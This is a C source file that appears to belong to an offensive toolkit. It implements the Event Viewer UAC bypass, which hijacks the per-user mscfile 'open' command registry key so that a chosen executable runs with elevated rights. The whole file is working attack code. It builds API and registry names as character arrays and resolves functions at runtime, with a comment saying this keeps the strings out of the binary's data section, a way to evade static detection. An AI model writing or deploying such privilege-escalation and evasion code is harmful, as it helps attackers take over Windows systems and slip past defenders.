#include "EvtViewerUACBypass.h"

BOOL setUpUACBypass(const char* filePath) {

	//Create Strings for interacting w/ the registry.
	WCHAR strAdvapidll[] = { 'A','d','v','a','p','i','3','2','.','d','l','l',0x0 };

	//define these locally so they're not stored in the .data section of the compiled binary.
	unsigned char strRegOpenKeyA[] = { 'R','e','g','O','p','e','n','K','e','y','A',0x0 };
	unsigned char strRegQueryValueA[] = { 'R','e','g','Q','u','e','r','y','V','a','l','u','e','A',0x0 };
	unsigned char strRegCreateKeyExA[] = { 'R','e','g','C','r','e','a','t','e','K','e','y','E','x','A',0x0 };
	unsigned char strRegSetValueA[] = { 'R','e','g','S','e','t','V','a','l','u','e','A',0x0 };
	unsigned char strRegSavekeyA[] = { 'R','e','g','S','a','v','e','K','e','y','A',0x0 };

	//Create Function pointers for interacting with the registry.
	t_RegOpenKeyA pRegOpenKeyA = (t_RegOpenKeyA)hlpGetProcAddress(hlpGetModuleHandle(strAdvapidll), strRegOpenKeyA);
	t_RegQueryValueA pRegQueryValueA = (t_RegQueryValueA)hlpGetProcAddress(hlpGetModuleHandle(strAdvapidll), strRegQueryValueA);
	t_RegCreateKeyExA pRegCreateKeyExA = (t_RegCreateKeyExA)hlpGetProcAddress(hlpGetModuleHandle(strAdvapidll), strRegCreateKeyExA);
	t_RegSetValueA pRegSetValueA = (t_RegSetValueA)hlpGetProcAddress(hlpGetModuleHandle(strAdvapidll), strRegSetValueA);
	t_RegSaveKeyA pRegSaveKeyA = (t_RegSaveKeyA)hlpGetProcAddress(hlpGetModuleHandle(strAdvapidll), strRegSavekeyA);

	//Create Query String
	unsigned char regKey[] = { 'S','o','f','t','w','a','r','e','\\','C','l','a','s','s','e','s','\\','m','s','c','f','i','l','e','\\','s','h','e','l','l','\\','o','p','e','n','\\','c','o','m','m','a','n','d',0x0 };

	LSTATUS status = NULL;
	LPSTR kData = NULL;
	PLONG lpcbData = NULL;
	
	//if Registry Exists.
	if (!pRegQueryValueA(HKEY_CURRENT_USER, regKey, kData, lpcbData)) {
		status = pRegSetValueA(HKEY_CURRENT_USER, regKey, REG_SZ, filePath, NULL);
		if (status) {
			printf("Could not Edit Registry Key");
			exit(-1);
		}
			
	}
	else {
		HKEY hkResult = NULL;
		status = pRegCreateKeyExA(HKEY_CURRENT_USER, (LPCSTR)regKey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hkResult, NULL);
		if (!status) {
			status = pRegSetValueA(HKEY_CURRENT_USER, regKey, REG_SZ, filePath, NULL);
			if (status) {
				printf("Could not Edit Registry Key");
				exit(-1);
			}
		}
		else {
			printf("Could not Create Registry Key\n");
			printf("status = %x", status);
			exit(-1);
		}
	}


}